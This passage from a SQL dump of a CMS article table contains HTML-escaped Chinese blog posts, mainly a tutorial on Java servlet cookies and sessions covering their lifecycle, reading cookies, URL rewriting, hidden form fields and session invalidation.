auto;font-weight:bold;font-size:10.5pt;-moz-background-clip:-moz-initial;-moz-background-origin:-moz-initial;-moz-background-inline-policy:-moz-initial;font-family:''宋体'';&quot;&gt;Hash&lt;span style=&quot;font-family:宋体;&quot;&gt;索引区&lt;/span&gt;&lt;span style=&quot;font-family:times new roman;&quot;&gt;(256K)&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;\r\n&lt;/td&gt;\r\n&lt;/tr&gt;\r\n&lt;tr style=&quot;height:93.25pt;&quot;&gt;&lt;td style=&quot;padding:0pt 5.4pt;background:none repeat scroll 0% 0% #7f7f7f;width:198pt;&quot; valign=&quot;center&quot; width=&quot;264&quot;&gt;&lt;p style=&quot;margin-bottom:0pt;margin-top:0pt;text-align:center;&quot;&gt;&lt;span style=&quot;background-color:#c0c0c0;background-image:none;background-repeat:repeat;background-attachment:scroll;background-position:0% 0%;-moz-background-size:auto auto;font-weight:bold;font-size:10.5pt;-moz-background-clip:-moz-initial;-moz-background-origin:-moz-initial;-moz-background-inline-policy:-moz-initial;font-family:''宋体'';&quot;&gt;Hash&lt;span style=&quot;font-family:宋体;&quot;&gt;链表区&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;\r\n&lt;/td&gt;\r\n&lt;/tr&gt;\r\n&lt;/tbody&gt;\r\n&lt;/table&gt;\r\n&lt;p style=&quot;text-indent:21.75pt;margin-bottom:0pt;margin-top:0pt;&quot;&gt;&lt;/p&gt;\r\n&lt;p style=&quot;text-indent:21.75pt;margin-bottom:0pt;margin-top:0pt;&quot;&gt;项目地址：&lt;a href=&quot;http://code.google.com/p/secache/&quot; target=&quot;_blank&quot;&gt;http://code.google.com/p/secache/&lt;/a&gt;&lt;/p&gt;\r\n			&lt;/div&gt;\r\n', 1, 1, 0, 0, 1301640989, 1, 'admin');
INSERT INTO `cp_article` (`id`, `cat_id`, `title`, `keywords`, `description`, `content`, `views`, `status`, `top`, `recommend`, `create_time`, `create_uid`, `create_username`) VALUES
(13, 1, 'Cookie和Session专题', '', '', '&lt;p&gt;&lt;span style=&quot;font-size:10.5pt;&quot;&gt;&lt;strong&gt;一、&lt;span&gt;cookie&lt;/span&gt;机制和&lt;span&gt;session&lt;/span&gt;机制的区别&lt;/strong&gt;&lt;span&gt;&lt;br /&gt;\r\n&lt;br /&gt;\r\n&lt;/span&gt;具体来说&lt;span&gt;cookie&lt;/span&gt;机制采用的是在&lt;font color=&quot;#993300&quot;&gt;客户端保持状态&lt;/font&gt;的方案，而&lt;span&gt;session&lt;/span&gt;机制采用的是在&lt;font color=&quot;#993300&quot;&gt;服务器端保持状态&lt;/font&gt;的方案。&lt;span&gt;&lt;br /&gt;\r\n&lt;/span&gt;同时我们也看到，由于才服务器端保持状态的方案在客户端也需要保存一个标识，所以&lt;span&gt;session&lt;br /&gt;\r\n&lt;/span&gt;机制可能需要借助于&lt;span&gt;cookie&lt;/span&gt;机制来达到保存标识的目的，但实际上还有其他选择&lt;/span&gt;&lt;/p&gt;\r\n&lt;p&gt;&lt;/p&gt;\r\n&lt;p&gt;&lt;span style=&quot;font-size:10.5pt;&quot;&gt;&lt;strong&gt;二、会话&lt;span&gt;cookie&lt;/span&gt;和持久&lt;span&gt;cookie&lt;/span&gt;的区别&lt;/strong&gt;&lt;span&gt;&lt;br /&gt;\r\n&lt;br /&gt;\r\n&lt;/span&gt;如果不设置过期时间，则表示这个&lt;span&gt;cookie&lt;/span&gt;&lt;font color=&quot;#993300&quot;&gt;生命周期为浏览器会话期间&lt;/font&gt;，只要&lt;font color=&quot;#993300&quot;&gt;关闭&lt;/font&gt;浏览器窗口，&lt;span&gt;cookie&lt;/span&gt;就消失了。这种生命期为&lt;font color=&quot;#993300&quot;&gt;浏览会话期的&lt;span&gt;cookie&lt;/span&gt;被称为会话&lt;span&gt;cookie&lt;/span&gt;&lt;/font&gt;。&lt;font color=&quot;#993300&quot;&gt;会话&lt;span&gt;cookie&lt;/span&gt;一般不保存在硬盘上而是保存在内存里。&lt;/font&gt;&lt;span&gt;&lt;br /&gt;\r\n&lt;/span&gt;如果设置了过期时间，浏览器就会把&lt;font color=&quot;#993300&quot;&gt;&lt;span&gt;cookie&lt;/span&gt;保存到硬&lt;/font&gt;盘上，关闭后再次打开浏览器，这些&lt;span&gt;cookie&lt;/span&gt;依然有效直到超过设定的过期时间。&lt;span&gt;&lt;br /&gt;\r\n&lt;/span&gt;存储在硬盘上的&lt;span&gt;cookie&lt;/span&gt;可以在不同的浏览器进程间共享，比如两个&lt;span&gt;IE&lt;/span&gt;窗口。&lt;font color=&quot;#993300&quot;&gt;而对于保存在内存的&lt;span&gt;cookie&lt;/span&gt;，不同的浏览器有不同的处理方式&lt;/font&gt;。&lt;span&gt;&lt;br /&gt;\r\n&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;\r\n&lt;p&gt;&lt;span style=&quot;font-size:10.5pt;&quot;&gt;&lt;strong&gt;三、如何利用实现自动登录&lt;/strong&gt;&lt;span&gt;&lt;br /&gt;\r\n&lt;br /&gt;\r\n&lt;/span&gt;当用户在某个网站注册后，就会收到一个惟一用户&lt;span&gt;ID&lt;/span&gt;的&lt;span&gt;cookie&lt;/span&gt;。客户后来重新连接时，这个&lt;span&gt;&lt;br /&gt;\r\n&lt;/span&gt;用户&lt;span&gt;ID&lt;/span&gt;会自动返回，服务器对它进行检查，确定它是否为注册用户且选择了自动登录，从而使用户务需给出明确的用户名和密码，就可以访问服务器上的资源。&lt;span&gt;&lt;br /&gt;\r\n&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;\r\n&lt;p&gt;&lt;span style=&quot;font-size:10.5pt;&quot;&gt;&lt;strong&gt;四、如何根据用户的爱好定制站点&lt;/strong&gt;&lt;span&gt;&lt;br /&gt;\r\n&lt;br /&gt;\r\n&lt;/span&gt;网站可以使用&lt;span&gt;cookie&lt;/span&gt;记录用户的意愿。对于简单的设置，网站可以直接将页面的设置存储在&lt;span&gt;cookie&lt;/span&gt;中完成定制。然而对于更复杂的定制，网站只需仅将一个惟一的标识符发送给用户，由服务器端的数据库存储每个标识符对应的页面设置。&lt;span&gt;&lt;br /&gt;\r\n&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;\r\n&lt;p&gt;&lt;span style=&quot;font-size:10.5pt;&quot;&gt;&lt;strong&gt;五、&lt;span&gt;cookie&lt;/span&gt;的发送&lt;/strong&gt;&lt;span&gt;&lt;br /&gt;\r\n&lt;br /&gt;\r\n1.&lt;/span&gt;创建&lt;span&gt;Cookie&lt;/span&gt;对象&lt;span&gt;&lt;br /&gt;\r\n2.&lt;/span&gt;设置最大时效&lt;span&gt;&lt;br /&gt;\r\n3.&lt;/span&gt;将&lt;span&gt;Cookie&lt;/span&gt;放入到&lt;span&gt;HTTP&lt;/span&gt;响应报头&lt;span&gt;&lt;br /&gt;\r\n&lt;/span&gt;如果你创建了一个&lt;span&gt;cookie&lt;/span&gt;，并将他发送到浏览器，默认情况下它是一个会话级别的&lt;span&gt;cookie:&lt;/span&gt;存储在浏览器的内存中，用户退出浏览器之后被删除。如果你希望浏览器将该&lt;span&gt;cookie&lt;/span&gt;存储在磁盘上，则&lt;span&gt;&lt;br /&gt;\r\n&lt;/span&gt;需要使用&lt;span&gt;maxAge&lt;/span&gt;，并给出一个以秒为单位的时间。将最大时效设为&lt;span&gt;0&lt;/span&gt;则是命令浏览器删除该&lt;span&gt;cookie&lt;/span&gt;。&lt;span&gt;&lt;br /&gt;\r\n&lt;/span&gt;发送&lt;span&gt;cookie&lt;/span&gt;需要使用&lt;font color=&quot;#993300&quot;&gt;&lt;span&gt;HttpServletResponse&lt;/span&gt;的&lt;span&gt;addCookie&lt;/span&gt;&lt;/font&gt;方法，将&lt;span&gt;cookie&lt;/span&gt;插入到一个&lt;span&gt;Set-Cookie&lt;/span&gt;　&lt;span&gt;HTTP&lt;/span&gt;请 求报头中。由于这个方法并不修改任何之前指定的&lt;span&gt;Set-Cookie&lt;/span&gt;报头，而是创建新的报头，因此我们将这个方法称为是&lt;span&gt;addCookie&lt;/span&gt;，而非&lt;span&gt; setCookie&lt;/span&gt;。同样要记住响应报头必须在任何文档内容发送到客户端之前设置。&lt;/span&gt;&lt;/p&gt;\r\n&lt;p&gt;&lt;span style=&quot;font-size:10.5pt;&quot;&gt;&lt;strong&gt;六、&lt;span&gt;cookie&lt;/span&gt;的读取&lt;/strong&gt;&lt;span&gt;&lt;br /&gt;\r\n&lt;br /&gt;\r\n&lt;font color=&quot;#993300&quot;&gt;1.&lt;/font&gt;&lt;/span&gt;&lt;font color=&quot;#993300&quot;&gt;调用&lt;/font&gt;&lt;span&gt;&lt;font color=&quot;#993300&quot;&gt;request.getCookie&lt;/font&gt;&lt;br /&gt;\r\n&lt;/span&gt;要获取有浏览器发送来的&lt;span&gt;cookie&lt;/span&gt;，需要调用&lt;font color=&quot;#993300&quot;&gt;&lt;span&gt;HttpServletRequest&lt;/span&gt;的&lt;span&gt;getCookies&lt;/span&gt;方法&lt;/font&gt;，这个调用返回&lt;span&gt;Cookie&lt;/span&gt;对象的数组，对应由&lt;span&gt;HTTP&lt;/span&gt;请求中&lt;span&gt;Cookie&lt;/span&gt;报头输入的值。&lt;span&gt;&lt;br /&gt;\r\n2.&lt;/span&gt;对数组进行循环，&lt;font color=&quot;#993300&quot;&gt;调用每个&lt;span&gt;cookie&lt;/span&gt;的&lt;span&gt;getName&lt;/span&gt;方法&lt;/font&gt;，直到找到感兴趣的&lt;span&gt;cookie&lt;/span&gt;为止&lt;span&gt;&lt;br /&gt;\r\ncookie&lt;/span&gt;与你的主机&lt;span&gt;(&lt;/span&gt;域&lt;span&gt;)&lt;/span&gt;相关，而非你的&lt;span&gt;servlet&lt;/span&gt;或&lt;span&gt;JSP&lt;/span&gt;页面。因而，尽管你的&lt;span&gt;servlet&lt;/span&gt;可能只发送了单个&lt;span&gt;cookie&lt;/span&gt;，你也可能会得到许多不相关的&lt;span&gt;cookie&lt;/span&gt;。&lt;span&gt;&lt;br /&gt;\r\n&lt;/span&gt;例如：&lt;span&gt;&lt;br /&gt;\r\nString cookieName = “userID”;&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp; Cookie cookies[] = request.getCookies();&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp; if (cookies!=null){&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; for(int i=0;i&amp;lt;cookies.length;i++){&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp; Cookie cookie = cookies[i];&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp; if (cookieName.equals(cookie.getName())){&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; doSomethingWith(cookie.getValue());&lt;br /&gt;\r\n}&lt;br /&gt;\r\n}&lt;br /&gt;\r\n}&lt;br /&gt;\r\n&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;\r\n&lt;p&gt;&lt;span style=&quot;font-size:10.5pt;&quot;&gt;&lt;strong&gt;七、如何使用&lt;span&gt;cookie&lt;/span&gt;检测初访者&lt;/strong&gt;&lt;span&gt;&lt;br /&gt;\r\n&lt;br /&gt;\r\nA.&lt;/span&gt;调用&lt;span&gt;HttpServletRequest.getCookies()&lt;/span&gt;获取&lt;span&gt;Cookie&lt;/span&gt;数组&lt;span&gt;&lt;br /&gt;\r\nB.&lt;/span&gt;在循环中检索指定名字的&lt;span&gt;cookie&lt;/span&gt;是否存在以及对应的值是否正确&lt;span&gt;&lt;br /&gt;\r\nC.&lt;/span&gt;如果是则退出循环并设置区别标识&lt;span&gt;&lt;br /&gt;\r\nD.&lt;/span&gt;根据区别标识判断用户是否为初访者从而进行不同的操作&lt;span&gt;&lt;br /&gt;\r\n&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;\r\n&lt;p&gt;&lt;span style=&quot;font-size:10.5pt;&quot;&gt;&lt;strong&gt;八、使用&lt;span&gt;cookie&lt;/span&gt;检测初访者的常见错误&lt;/strong&gt;&lt;span&gt;&lt;br /&gt;\r\n&lt;br /&gt;\r\n&lt;/span&gt;不能仅仅因为&lt;span&gt;cookie&lt;/span&gt;数组中不存在在特定的数据项就认为用户是个初访者。如果&lt;span&gt;cookie&lt;/span&gt;数组为&lt;span&gt;null&lt;/span&gt;，客户可能是一个初访者，也可能是由于用户将&lt;span&gt;cookie&lt;/span&gt;删除或禁用造成的结果。&lt;span&gt;&lt;br /&gt;\r\n&lt;/span&gt;但是，如果数组非&lt;span&gt;null,&lt;/span&gt;也不过是显示客户曾经到过你的网站或域，并不能说明他们曾经访问过你的&lt;span&gt;servlet&lt;/span&gt;。其它&lt;span&gt;servlet&lt;/span&gt;、&lt;span&gt;JSP&lt;/span&gt;页面以及非&lt;span&gt;Java Web&lt;/span&gt;应用都可以设置&lt;span&gt;cookie&lt;/span&gt;，依据路径的设置，其中的任何&lt;span&gt;cookie&lt;/span&gt;都有可能返回给用户的浏览器。&lt;span&gt;&lt;br /&gt;\r\n&lt;/span&gt;正确的做法是&lt;font color=&quot;#993300&quot;&gt;判断&lt;span&gt;cookie&lt;/span&gt;数组是否为空且是否存在指定的&lt;span&gt;Cookie&lt;/span&gt;对象且值正确。&lt;/font&gt;&lt;span&gt;&lt;br /&gt;\r\n&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;\r\n&lt;p&gt;&lt;span style=&quot;font-size:10.5pt;&quot;&gt;&lt;strong&gt;九、使用&lt;span&gt;cookie&lt;/span&gt;属性的注意问题&lt;/strong&gt;&lt;span&gt;&lt;br /&gt;\r\n&lt;br /&gt;\r\n&lt;/span&gt;属性是从服务器发送到浏览器的报头的一部分；但它们不属于由浏览器返回给服务器的报头。　&lt;span&gt;&lt;br /&gt;\r\n&lt;/span&gt;因此除了名称和值之外，&lt;span&gt;cookie&lt;/span&gt;属性只适用于从服务器输出到客户端的&lt;span&gt;cookie&lt;/span&gt;；服务器端来自于浏览器的&lt;span&gt;cookie&lt;/span&gt;并没有设置这些属性。　&lt;span&gt;&lt;br /&gt;\r\n&lt;/span&gt;因而不要期望通过&lt;span&gt;request.getCookies&lt;/span&gt;得到的&lt;span&gt;cookie&lt;/span&gt;中可以使用这个属性。这意味着，你不能仅仅通过设置&lt;span&gt;cookie&lt;/span&gt;的最大时效，发 出它，在随后的输入数组中查找适当的&lt;span&gt;cookie,&lt;/span&gt;读取它的值，修改它并将它存回&lt;span&gt;Cookie&lt;/span&gt;，从而实现不断改变的&lt;span&gt;cookie&lt;/span&gt;值。&lt;span&gt;&lt;br /&gt;\r\n&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;\r\n&lt;p&gt;&lt;span style=&quot;font-size:10.5pt;&quot;&gt;&lt;strong&gt;十、如何使用&lt;span&gt;cookie&lt;/span&gt;记录各个用户的访问计数&lt;/strong&gt;&lt;span&gt;&lt;br /&gt;\r\n&lt;br /&gt;\r\n1.&lt;/span&gt;获取&lt;span&gt;cookie&lt;/span&gt;数组中专门用于统计用户访问次数的&lt;span&gt;cookie&lt;/span&gt;的值&lt;span&gt;&lt;br /&gt;\r\n2.&lt;/span&gt;将值转换成&lt;span&gt;int&lt;/span&gt;型&lt;span&gt;&lt;br /&gt;\r\n3.&lt;/span&gt;将值加&lt;span&gt;1&lt;/span&gt;并用原来的名称重新创建一个&lt;span&gt;Cookie&lt;/span&gt;对象&lt;span&gt;&lt;br /&gt;\r\n4.&lt;/span&gt;重新设置最大时效&lt;span&gt;&lt;br /&gt;\r\n5.&lt;/span&gt;将新的&lt;span&gt;cookie&lt;/span&gt;输出&lt;span&gt;&lt;br /&gt;\r\n&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;\r\n&lt;p&gt;&lt;span style=&quot;font-size:10.5pt;&quot;&gt;&lt;strong&gt;十一、&lt;span&gt;session&lt;/span&gt;在不同环境下的不同含义&lt;/strong&gt;&lt;span&gt;&lt;br /&gt;\r\n&lt;br /&gt;\r\nsession&lt;/span&gt;，中文经常翻译为会话，其本来的含义是指有始有终的一系列动作&lt;span&gt;/&lt;/span&gt;消息，比如打电话是从拿起电话拨号到挂断电话这中间的一系列过程可以称之为一个&lt;span&gt;session&lt;/span&gt;。&lt;span&gt;&lt;br /&gt;\r\n&lt;/span&gt;然而当&lt;span&gt;session&lt;/span&gt;一词与网络协议相关联时，它又往往隐含了&lt;span&gt;“&lt;/span&gt;面向连接&lt;span&gt;”&lt;/span&gt;和&lt;span&gt;/&lt;/span&gt;或&lt;span&gt;“&lt;/span&gt;保持状态&lt;span&gt;”&lt;/span&gt;这样两个含义。&lt;span&gt;&lt;br /&gt;\r\nsession&lt;/span&gt;在&lt;span&gt;Web&lt;/span&gt;开发环境下的语义又有了新的扩展，&lt;font color=&quot;#993300&quot;&gt;它的含义是指一类用来在客户端与服务器端之间保持状态的解决方案。&lt;/font&gt;有时候&lt;span&gt;Session&lt;/span&gt;也用来指这种解决方案的存储结构。&lt;span&gt;&lt;br /&gt;\r\n&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;\r\n&lt;p&gt;&lt;span style=&quot;font-size:10.5pt;&quot;&gt;&lt;strong&gt;十二、&lt;span&gt;session&lt;/span&gt;的机制&lt;/strong&gt;&lt;span&gt;&lt;br /&gt;\r\n&lt;br /&gt;\r\n&lt;font color=&quot;#993300&quot;&gt;session&lt;/font&gt;&lt;/span&gt;&lt;font color=&quot;#993300&quot;&gt;机制是一种服务器端的机制&lt;/font&gt;，服务器使用一种类似于散列表的结构&lt;span&gt;(&lt;/span&gt;也可能就是使用散列表&lt;span&gt;)&lt;/span&gt;来保存信息。&lt;span&gt;&lt;br /&gt;\r\n&lt;/span&gt;但程序需要为某个客户端的请求创建一个&lt;span&gt;session&lt;/span&gt;的时候，服务器首先检查这个客户端的请求里是否包含了一个&lt;span&gt;session&lt;/span&gt;标识－称为&lt;span&gt;session id,&lt;/span&gt;如果已经包含一个&lt;span&gt;session id&lt;/span&gt;则说明以前已经为此客户创建过&lt;span&gt;session&lt;/span&gt;，服务器就按照&lt;span&gt;session id&lt;/span&gt;把这个&lt;span&gt;session&lt;/span&gt;检索出来使用&lt;span&gt;(&lt;/span&gt;如果检索不到，可能会新建一个，这种情况可能出现在服务端已经删除了该用户对应的&lt;span&gt;session&lt;/span&gt;对象，但用户人为 地在请求的&lt;span&gt;URL&lt;/span&gt;后面附加上一个&lt;span&gt;JSESSION&lt;/span&gt;的参数&lt;span&gt;)&lt;/span&gt;。&lt;span&gt;&lt;br /&gt;\r\n&lt;/span&gt;如果客户请求不包含&lt;span&gt;session id&lt;/span&gt;，则为此客户创建一个&lt;span&gt;session&lt;/span&gt;并且生成一个与此&lt;span&gt;session&lt;/span&gt;相关联的&lt;span&gt;session id&lt;/span&gt;，这个&lt;span&gt;session id&lt;/span&gt;将在本次响应中返回给客户端保存。&lt;span&gt;&lt;br /&gt;\r\n&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;\r\n&lt;p&gt;&lt;span style=&quot;font-size:10.5pt;&quot;&gt;&lt;strong&gt;十三、保存&lt;span&gt;session id&lt;/span&gt;的几种方式&lt;/strong&gt;&lt;span&gt;&lt;br /&gt;\r\n&lt;br /&gt;\r\nA&lt;/span&gt;．保存&lt;span&gt;session id&lt;/span&gt;的方式可以采用&lt;span&gt;cookie&lt;/span&gt;，这样在交互过程中浏览器可以自动的按照规则把这个标识发送给服务器。&lt;span&gt;&lt;br /&gt;\r\nB&lt;/span&gt;．由于&lt;span&gt;cookie&lt;/span&gt;可以被人为的禁止，必须有其它的机制以便在&lt;span&gt;cookie&lt;/span&gt;被禁止时仍然能够把&lt;span&gt;session id&lt;/span&gt;传递回服务器，经常采用的一种技术叫做&lt;span&gt;URL&lt;/span&gt;重写，就是把&lt;span&gt;session id&lt;/span&gt;附加在&lt;span&gt;URL&lt;/span&gt;路径的后面，附加的方式也有两种，一种是作为&lt;span&gt;URL&lt;/span&gt;路径的附加信息，另一种是作为查询字符串附加在&lt;span&gt;URL&lt;/span&gt;后面。网络在整个交互过程中始终 保持状态，就必须在每个客户端可能请求的路径后面都包含这个&lt;span&gt;session id&lt;/span&gt;。&lt;span&gt;&lt;br /&gt;\r\nC&lt;/span&gt;．另一种技术叫做表单隐藏字段。就是服务器会自动修改表单，添加一个隐藏字段，以便在表单提交时能够把&lt;span&gt;session id&lt;/span&gt;传递回服务器。&lt;span&gt;&lt;br /&gt;\r\n&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;\r\n&lt;p&gt;&lt;span style=&quot;font-size:10.5pt;&quot;&gt;&lt;strong&gt;十四、&lt;span&gt;session&lt;/span&gt;什么时候被创建&lt;/strong&gt;&lt;span&gt;&lt;br /&gt;\r\n&lt;br /&gt;\r\n&lt;/span&gt;一个常见的错误是以为&lt;span&gt;session&lt;/span&gt;在有客户端访问时就被创建，然而事实是直到某&lt;span&gt;server&lt;/span&gt;端程序&lt;span&gt;(&lt;/span&gt;如&lt;span&gt;Servlet)&lt;/span&gt;调用&lt;span&gt;HttpServletRequest.getSession(true)&lt;/span&gt;这样的语句时才会被创建。&lt;span&gt;&lt;br /&gt;\r\n&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;\r\n&lt;p&gt;&lt;span style=&quot;font-size:10.5pt;&quot;&gt;&lt;strong&gt;十五、&lt;span&gt;session&lt;/span&gt;何时被删除&lt;/strong&gt;&lt;span&gt;&lt;br /&gt;\r\n&lt;br /&gt;\r\nsession&lt;/span&gt;在下列情况下被删除：&lt;span&gt;&lt;br /&gt;\r\n&lt;font color=&quot;#993300&quot;&gt;A&lt;/font&gt;&lt;/span&gt;&lt;font color=&quot;#993300&quot;&gt;．程序调用&lt;span&gt;HttpSession.invalidate()&lt;br /&gt;\r\nB&lt;/span&gt;．距离上一次收到客户端发送的&lt;span&gt;session id&lt;/span&gt;时间间隔超过了&lt;span&gt;session&lt;/span&gt;的最大有效时间&lt;span&gt;&lt;br /&gt;\r\nC&lt;/span&gt;．服务器进程被停止&lt;/font&gt;&lt;/span&gt;&lt;/p&gt;\r\n&lt;p&gt;&lt;span style=&quot;font-size:10.5pt;&quot;&gt;再次注意关闭浏览器只会使存储在客户端浏览器内存中的&lt;span&gt;session cookie&lt;/span&gt;失效，不会使服务器端的&lt;span&gt;session&lt;/span&gt;对象失效。&lt;span&gt;&lt;br /&gt;\r\n&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;\r\n&lt;p&gt;&lt;span style=&quot;font-size:10.5pt;&quot;&gt;&lt;strong&gt;十六、&lt;span&gt;URL&lt;/span&gt;重写有什么缺点&lt;/strong&gt;&lt;span&gt;&lt;br /&gt;\r\n&lt;br /&gt;\r\n&lt;/span&gt;对所有的&lt;span&gt;URL&lt;/span&gt;使用&lt;span&gt;URL&lt;/span&gt;重写，包括超链接，&lt;span&gt;form&lt;/span&gt;的&lt;span&gt;action&lt;/span&gt;，和重定向的&lt;span&gt;URL&lt;/span&gt;。每个引用你的站点的&lt;span&gt;URL&lt;/span&gt;，以及那些返回给用户的&lt;span&gt;URL(&lt;/span&gt;即使通过间接手段，比如服务器重定向中的&lt;span&gt;Location&lt;/span&gt;字段&lt;span&gt;)&lt;/span&gt;都要添加额外的信息。&lt;span&gt;&lt;br /&gt;\r\n&lt;/span&gt;这意味着在你的站点上不能有任何静态的&lt;span&gt;HTML&lt;/span&gt;页面&lt;span&gt;(&lt;/span&gt;至少静态页面中不能有任何链接到站点动态页面的链接&lt;span&gt;)&lt;/span&gt;。因此，每个页面都必须使用&lt;span&gt;servlet&lt;/span&gt;或&lt;span&gt; JSP&lt;/span&gt;动态生成。即使所有的页面都动态生成，如果用户离开了会话并通过书签或链接再次回来，会话的信息都会丢失，因为存储下来的链接含有错误的标识信息－ 该&lt;span&gt;URL&lt;/span&gt;后面的&lt;span&gt;SESSION ID&lt;/span&gt;已经过期了。　　&lt;span&gt;&lt;br /&gt;\r\n&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;\r\n&lt;p&gt;&lt;span style=&quot;font-size:10.5pt;&quot;&gt;&lt;strong&gt;十七、使用隐藏的表单域有什么缺点&lt;/strong&gt;&lt;span&gt;&lt;br /&gt;\r\n&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp; &lt;/span&gt;仅当每个页面都是有表单提交而动态生成时，才能使用这种方法。单击常规的&lt;span&gt;&amp;lt;A HREF..&amp;gt;&lt;/span&gt;超文本链接并不产生表单提交，因此隐藏的表单域不能支持通常的会话跟踪，只能用于一系列特定的操作中，比如在线商店的结账过程&lt;span&gt;&lt;br /&gt;\r\n&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;\r\n&lt;p&gt;&lt;span style=&quot;font-size:10.5pt;&quot;&gt;&lt;strong&gt;十八、会话跟踪的基本步骤&lt;/strong&gt;&lt;span&gt;&lt;br /&gt;\r\n&lt;br /&gt;\r\n&lt;font color=&quot;#993300&quot;&gt;1&lt;/font&gt;&lt;/span&gt;&lt;font color=&quot;#993300&quot;&gt;．访问与当前请求相关的会话对象&lt;span&gt;&lt;br /&gt;\r\n2&lt;/span&gt;．查找与会话相关的信息&lt;span&gt;&lt;br /&gt;\r\n3&lt;/span&gt;．存储会话信息&lt;span&gt;&lt;br /&gt;\r\n4&lt;/span&gt;．废弃会话数据&lt;/font&gt;&lt;span&gt;&lt;br /&gt;\r\n&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;\r\n&lt;p&gt;&lt;span style=&quot;font-size:10.5pt;&quot;&gt;&lt;strong&gt;十九、&lt;span&gt;getSession()/getSession(true)&lt;/span&gt;、&lt;span&gt;getSession(false)&lt;/span&gt;的区别&lt;/strong&gt;&lt;span&gt;&lt;br /&gt;\r\n&lt;br /&gt;\r\ngetSession()/getSession(true)&lt;/span&gt;：当&lt;span&gt;session&lt;/span&gt;存在时返回该&lt;span&gt;session&lt;/span&gt;，否则新建一个&lt;span&gt;session&lt;/span&gt;并返回该对象&lt;span&gt;&lt;br /&gt;\r\ngetSession(false)&lt;/span&gt;：当&lt;span&gt;session&lt;/span&gt;存在时返回该&lt;span&gt;session&lt;/span&gt;，否则不会新建&lt;span&gt;session&lt;/span&gt;，返回&lt;span&gt;null&lt;br /&gt;\r\n&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;\r\n&lt;p&gt;&lt;span style=&quot;font-size:10.5pt;&quot;&gt;&lt;strong&gt;二十、如何将信息于会话关联起来&lt;/strong&gt;&lt;span&gt;&lt;br /&gt;\r\n&lt;br /&gt;\r\nsetAttribute&lt;/span&gt;会替换任何之前设定的值；如果想要在不提供任何代替的情况下移除某个值，则应使用&lt;span&gt;removeAttribute&lt;/span&gt;。这个方法会触发所有实现了&lt;span&gt;HttpSessionBindingListener&lt;/span&gt;接口的值的&lt;span&gt;valueUnbound&lt;br /&gt;\r\n&lt;/span&gt;方法。&lt;span&gt;&lt;br /&gt;\r\n&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;\r\n&lt;p&gt;&lt;span style=&quot;font-size:10.5pt;&quot;&gt;&lt;strong&gt;二十一、会话属性的类型有什么限制吗&lt;/strong&gt;&lt;span&gt;&lt;br /&gt;\r\n&lt;br /&gt;\r\n&lt;/span&gt;通常会话属性的类型只要是&lt;span&gt;Object&lt;/span&gt;就可以了。除了&lt;span&gt;null&lt;/span&gt;或基本类型，如&lt;span&gt;int,double,boolean&lt;/span&gt;。&lt;span&gt;&lt;br /&gt;\r\n&lt;/span&gt;如果要使用基本类型的值作为属性，必须将其转换为相应的封装类对象&lt;span&gt;&lt;br /&gt;\r\n&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;\r\n&lt;p&gt;&lt;span style=&quot;font-size:10.5pt;&quot;&gt;&lt;strong&gt;二十二、如何废弃会话数据&lt;/strong&gt;&lt;span&gt;&lt;br /&gt;\r\n&lt;br /&gt;\r\nA&lt;/span&gt;．只移除自己编写的&lt;span&gt;servlet&lt;/span&gt;创建的数据：&lt;span&gt;&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp; &lt;/span&gt;调用&lt;span&gt;removeAttribute(“key”)&lt;/span&gt;将指定键关联的值废弃&lt;span&gt;&lt;br /&gt;\r\nB&lt;/span&gt;．删除整个会话&lt;span&gt;(&lt;/span&gt;在当前&lt;span&gt;Web&lt;/span&gt;应用中&lt;span&gt;)&lt;/span&gt;：&lt;span&gt;&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp; &lt;/span&gt;调用&lt;span&gt;invalidate&lt;/span&gt;，将整个会话废弃掉。这样做会丢失该用户的所有会话数据，而非仅仅由我们&lt;span&gt;&lt;br /&gt;\r\nservlet&lt;/span&gt;或&lt;span&gt;JSP&lt;/span&gt;页面创建的会话数据&lt;span&gt;&lt;br /&gt;\r\nC&lt;/span&gt;．将用户从系统中注销并删除所有属于他&lt;span&gt;(&lt;/span&gt;或她&lt;span&gt;)&lt;/span&gt;的会话&lt;span&gt;&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp; &lt;/span&gt;调用&lt;span&gt;logOut&lt;/span&gt;，将客户从&lt;span&gt;Web&lt;/span&gt;服务器中注销，同时废弃所有与该用户相关联的会话&lt;span&gt;(&lt;/span&gt;每个&lt;span&gt;Web&lt;/span&gt;应用至多一个&lt;span&gt;)&lt;/span&gt;。这个操作有可能影响到服务器上多个不同的&lt;span&gt;Web&lt;/span&gt;应用&lt;span&gt;&lt;br /&gt;\r\n&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;\r\n&lt;p&gt;&lt;span 